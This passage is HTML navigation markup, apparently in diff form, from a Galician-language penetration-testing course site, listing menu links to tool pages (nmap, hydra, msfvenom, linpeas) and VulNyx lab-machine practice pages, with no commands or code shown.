+  
+  <span class="md-ellipsis">
+    Xenérico
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nmap-sCV/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Opción -sCV
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nmap-nse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Scripts NSE
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../whatweb/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    whatweb
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../curl/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    curl
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Fase 2. Análise
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            Fase 2. Análise
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../comandos-tipo-fase2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Comandos
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4_2" id="__nav_2_4_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Enumeración/Fuzzing contidos web
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            Enumeración/Fuzzing contidos web
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../dirb/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    dirb
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../gobuster/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    gobuster
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../wfuzz/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    wfuzz
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nikto/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    nikto
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../enum4linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    enum4linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../smbclient/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    smbclient
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../showmount/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    showmount
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../redis-cli/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    redis-cli
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mongosh/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    mongosh
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../finger/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    finger
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../searchsploit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    searchsploit
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../exiftool/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    exiftool
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../wpscan/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    wpscan
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_5" id="__nav_2_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Fase 3. Explotación
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_5">
+            <span class="md-nav__icon md-icon"></span>
+            Fase 3. Explotación
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../comandos-tipo-fase3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Comandos
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../annex/hydra/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    hydra
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssh2john/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ssh2john
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../annex/john/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    john
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../annex/hashcat/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    hashcat
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    nc/netcat
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../revshells/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Reverse Shells
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssh/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SSH (Secure Shell)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ftp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    FTP (File Transfer Protocol)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqlmap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    sqlmap
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../msfconsole/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Metasploit Framework (msfconsole)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../msfvenom/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Xerar payloads/shells (msfvenom)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_6" id="__nav_2_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Fase 4. Post‑explotación
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_6">
+            <span class="md-nav__icon md-icon"></span>
+            Fase 4. Post‑explotación
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../comandos-tipo-fase4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Comandos
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../comandos_fase4/sudo-l/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    sudo -l
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../comandos_fase4/find/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    find
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../comandos_fase4/getcap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    getcap
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../comandos_fase4/linpeas/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    linpeas.sh
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../comandos_fase4/pspy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    pspy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../comandos_fase4/cat_grep/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    cat/grep
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../comandos_fase4/su/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    su
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../comandos_fase4/base64/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    base64
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../comandos_fase4/python_http_server/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Python HTTP Server
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../comandos_fase4/wget_curl_scp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    wget/curl/scp
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Prácticas Taller UD2
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Prácticas Taller UD2
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    VulNyx
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            VulNyx
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/vulnyx/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introdución
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_2" id="__nav_3_1_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Prácticas Taller
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            Prácticas Taller
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_2_1" id="__nav_3_1_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Máquinas virtuais nivel Low, so Linux
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_1_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Máquinas virtuais nivel Low, so Linux
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/indice_vulnyx_low_linux_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Índice
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-doctor/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Doctor
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-fing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Fing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-shock/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Shock
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-real/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Real
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-zero/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Zero
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-deploy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Deploy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-node/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Node
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-noob/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Noob
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-look/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Look
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-beginner/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Beginner
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-share/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Share
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-plot/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Plot
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-wicca/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Wicca
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-robot/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Robot
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-basic/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Basic
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-first/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    First
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-mux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Mux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-infected/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Infected
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-agent/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Agent
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-hackingstation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Hackingstation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-diff3r3nts3c/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Diff3r3ntS3c
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-exec/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Exec
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-lower/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lower
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-blogger/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Blogger
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-lower2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lower2
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-lower3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lower3
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-lower4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lower4
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-loweb/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Loweb
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-lower6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lower6
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/doc-vulnyx-lower7/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lower7
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/resumo-ataque-indice_vulnyx_low_linux_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Resumo
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_2_2" id="__nav_3_1_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Máquinas virtuais nivel Low, so Windows
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_1_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Máquinas virtuais nivel Low, so Windows
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/indice_vulnyx_low_windows_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Índice
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/windows/doc-vulnyx-experience/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Experience
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/windows/doc-vulnyx-eternal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Eternal
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/windows/doc-vulnyx-build/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Build
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/resumo-ataque-indice_vulnyx_low_windows_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Resumo
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_2_3" id="__nav_3_1_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Máquinas virtuais nivel Easy, so Windows
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_1_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Máquinas virtuais nivel Easy, so Windows
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/indice_vulnyx_easy_windows_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Índice
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
